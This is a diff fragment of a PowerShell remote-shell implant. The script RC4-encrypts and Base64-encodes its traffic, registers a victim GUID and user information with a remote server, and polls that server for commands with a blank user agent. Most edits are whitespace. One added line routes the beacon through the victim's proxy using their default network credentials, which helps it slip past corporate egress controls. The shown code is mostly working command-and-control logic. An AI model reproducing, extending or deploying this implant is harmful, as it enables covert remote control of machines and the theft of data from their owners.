@@ -71,7 +71,7 @@ function Crypto-RC4 {
 function RC4-DecodeBase64 {
     [CmdletBinding()]
     Param (
-		[Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
+	[Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
         [string]$Buffer,
         [Parameter(Mandatory = $True)]
         [string]$Key
@@ -87,7 +87,7 @@ function RC4-DecodeBase64 {
 function RC4-EncodeBase64 {
     [CmdletBinding()]
     Param (
-		[Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
+	[Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
         [string]$Buffer,
         [Parameter(Mandatory = $True)]
         [string]$Key
@@ -124,6 +124,7 @@ function PS-RemoteShell {
 		$Guid = [GUID]::NewGuid().ToString()
 		$UserInfo = Get-UserInfo
 		$BodyData = "register $($Guid) $($UserInfo)"
+		(New-Object System.Net.WebClient).Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
 		
 		While($Exit -ne $True) {
 			if ($Protocol -eq "https") {
@@ -147,7 +148,6 @@ function PS-RemoteShell {
 			$Cmd = ""
 			Start-Sleep -m $Delay
 			$Url = "$($Protocol)://$($Ip):$($Port)/?$($Guid)"
-			
 			$BodyData = RC4-EncodeBase64 -Buffer $BodyData -Key $Key
 			Try {
 				$Data = Invoke-WebRequest -Uri $Url -Method POST -Body $BodyData -UserAgent "" -TimeoutSec 10 -UseBasicParsing
